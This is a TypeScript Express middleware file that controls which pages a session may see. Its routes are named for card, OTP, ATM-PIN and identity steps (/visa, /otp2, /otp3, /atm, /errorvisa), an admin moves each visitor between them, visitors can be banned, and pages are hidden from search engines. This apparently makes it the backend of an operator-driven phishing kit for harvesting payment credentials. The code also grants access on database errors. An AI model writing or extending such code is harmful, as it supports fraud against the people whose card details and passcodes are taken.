/**
 * Session-based Access Control Middleware
 *
 * Access rules:
 * - /form: Allowed if visitor has submitted data OR authorized by admin OR was redirected here
 * - /select: Allowed if visitor has submitted vehicle data OR authorized by admin OR was redirected here
 * - Other protected routes: Allowed if authorized by admin OR was redirected here
 * - Blocked visitors are always redirected to /ban
 */

import { Request, Response, NextFunction } from "express";
import { isVisitorAuthorized, isVisitorBlocked, listSubmissions, hasAllowedPage } from "@workspace/db";

// Protected routes
const PROTECTED_ROUTES = [
  "/form",
  "/select",
  "/total",
  "/total2",
  "/visa",
  "/otp",
  "/otp2",
  "/otp3",
  "/atm",
  "/nomer",
  "/waiting",
  "/errorvisa",
  "/identity-check",
];

// Routes excluded from block check (public routes and admin)
const EXCLUDED_ROUTES = [
  "/api/",
  "/api",
  "/admin",
  "/health",
];

/**
 * Set security headers
 */
function setSecurityHeaders(res: Response): void {
  res.setHeader("X-Robots-Tag", "noindex, nofollow");
  res.setHeader("Cache-Control", "no-store");
}

/**
 * Extract session ID
 */
function getSessionId(req: Request): string | null {
  const header = req.headers["x-session-id"];
  if (typeof header === "string") return header;
  
  const cookie = (req.headers.cookie || "").split(";")
    .find(c => c.trim().startsWith("sessionId="));
  if (cookie) {
    const [, value] = cookie.split("=");
    return value?.trim();
  }
  
  const query = req.query.sessionId;
  if (typeof query === "string") return query;
  
  return null;
}

/**
 * Main middleware
 */
export function sessionAuthMiddleware(req: Request, res: Response, next: NextFunction): void {
  const path = req.path;

  // Skip excluded routes (API, admin, health) - check both exact match and prefix
  if (EXCLUDED_ROUTES.some(p => path === p || path.startsWith(p + "/"))) {
    return next();
  }

  const sessionId = getSessionId(req);

  // If no session ID - check if it's a protected route, then allow
  if (!sessionId) {
    if (PROTECTED_ROUTES.some(p => path === p || path.startsWith(p + "/"))) {
      setSecurityHeaders(res);
      res.redirect(302, "/");
      return;
    }
    return next();
  }

  // Sync check - check block status synchronously if possible
  // For async, we handle it in the API endpoints
  const blocked = (req as any).isBlocked;
  if (blocked === true) {
    console.log(`[Auth] Blocked visitor ${sessionId.substring(0, 8)}... tried to access ${path}`);
    setSecurityHeaders(res);
    res.status(403).json({ error: "blocked", redirect: "/ban" });
    return;
  }

  // Continue with normal auth checks for protected routes
  if (PROTECTED_ROUTES.some(p => path === p || path.startsWith(p + "/"))) {
    checkProtectedRouteAccess(req, res, next, sessionId, path);
    return;
  }

  return next();
}

/**
 * Check access for protected routes
 */
function checkProtectedRouteAccess(req: Request, res: Response, next: NextFunction, sessionId: string, path: string): void {
  // Skip if already handled
  if (res.headersSent) {
    return;
  }

  // Check auth - proceed on error to allow access
  isVisitorAuthorized(sessionId)
    .then((authorized) => {
      if (authorized) return next();
      
      // Check if visitor was redirected to this page by admin
      return hasAllowedPage(sessionId, path)
        .then((hasPageAccess) => {
          if (hasPageAccess) return next();
          
          // Check submissions for /form and /select
          return listSubmissions({ sessionId })
            .then((submissions) => {
              const hasInitial = submissions.some(s => s.type === "initial");
              const hasVehicle = submissions.some(s => s.type === "vehicle");
              
              // /form needs initial submission
              if (path === "/form" && hasInitial) return next();
              
              // /select needs vehicle submission
              if (path === "/select" && hasVehicle) return next();
              
              // Default: redirect
              console.log(`[Auth] Access denied to ${path} for session ${sessionId.substring(0, 8)}...`);
              setSecurityHeaders(res);
              res.redirect(302, "/");
            })
            .catch(() => next()); // Allow on error
        });
    })
    .catch(() => next()); // Allow on error
}
